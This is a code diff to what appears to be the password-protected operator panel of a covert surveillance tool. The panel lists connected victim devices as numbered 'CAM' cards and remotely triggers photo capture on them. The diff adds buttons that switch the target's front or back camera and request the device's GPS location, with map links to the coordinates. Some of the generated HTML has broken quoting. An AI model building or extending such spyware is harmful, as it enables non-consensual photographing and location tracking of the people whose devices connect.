@@ -6,14 +6,17 @@
 <style>
 body { font-family: Arial; background: #121212; color: #fff; margin: 0; padding: 20px; }
 #login { position: fixed; top:0; left:0; width:100%; height:100%; background:#0a0a0a; display:flex; flex-direction:column; align-items:center; justify-content:center; z-index:100; }
-input, button { padding: 10px; margin: 5px; font-size: 15px; border-radius: 5px; border: none; }
+input, button { padding: 8px; margin: 4px; font-size: 14px; border-radius: 5px; border: none; }
 button { background: #00e676; font-weight: bold; cursor: pointer; }
-.grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; margin-top: 15px; }
+.grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px; margin-top: 15px; }
 .card { background: #1a1a1a; border: 1px solid #333; border-radius: 6px; overflow: hidden; }
-.head { background: #252525; padding: 8px; font-size: 11px; display: flex; justify-content: space-between; }
+.head { background: #252525; padding: 8px; font-size: 11px; display: flex; justify-content: space-between; align-items: center; }
 .body img { width: 100%; height: 180px; object-fit: cover; background: #000; display: block; }
-.footer { padding: 8px; background: #1e1e1e; }
-.footer button { width: 100%; background: #ff1744; color: #fff; }
+.footer { padding: 8px; background: #1e1e1e; display: flex; gap: 5px; }
+.footer button { flex: 1; font-size: 12px; }
+.btn-cap { background: #ff1744; color: #fff; }
+.btn-sw { background: #ff9800; color: #fff; }
+.btn-loc { background: #2196f3; color: #fff; }
 .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; margin-top: 15px; }
 .p-card { background: #222; padding: 6px; border-radius: 5px; text-align: center; }
 .p-card img { width: 100%; border-radius: 4px; }
@@ -43,6 +46,8 @@ socket.emit('admin-auth-success');
 } else alert('Wrong Password');
 }
 function capture(id) { socket.emit('admin-trigger-capture', id); }
+function requestLoc(id) { socket.emit('admin-request-location', id); }
+function switchCam(id, facing) { socket.emit('admin-switch-camera', { targetId: id, facing: facing }); }
 function deletePhoto(fn, elId) { socket.emit('delete-photo', fn); document.getElementById(elId).remove(); }
 
 socket.on('update-users-list', (users) => {
@@ -53,11 +58,11 @@ grid.innerHTML = '';
 keys.forEach((id, idx) => {
 const u = users[id];
 const dev = u.deviceInfo || 'Device';
-let locHtml = 'GPS: Not shared';
+let locHtml = '<button class="btn-loc" onclick="requestLoc(\\'' + id + '\\')">?? Track Loc</button>';
 if(u.location) {
-locHtml = '<a href="https://maps.google.com/?q=' + u.location.lat + ',' + u.location.lon + '" target="_blank" style="color:#00e676">?? View Map</a>';
+locHtml = '<a href="https://maps.google.com/?q=' + u.location.lat + ',' + u.location.lon + '" target="_blank" style="color:#00e676; font-weight:bold;">??? Open Map</a>';
 }
-grid.innerHTML += '<div class="card" id="c_' + id + '"><div class="head"><span>CAM ' + (idx+1) + ': ' + dev + '</span><span>' + locHtml + '</span></div><div class="body"><img id="img_' + id + ' src=`"></div><div class="footer"><button onclick="capture(\\'' + id + '\\')">?? Capture Photo</button></div></div>';
+grid.innerHTML += '<div class="card" id="c_' + id + '"><div class="head"><span>CAM ' + (idx+1) + ': ' + dev + '</span><span>' + locHtml + '</span></div><div class="body"><img id="img_' + id + ' src=`"></div><div class="footer"><button class="btn-sw" onclick="switchCam(\\'' + id + '\\', 'user')">Front</button><button class="btn-sw" onclick="switchCam(\\'' + id + '\\', 'environment')">Back</button><button class="btn-cap" onclick="capture(\\'' + id + '\\')">?? Capture</button></div></div>';
 });
 });
 
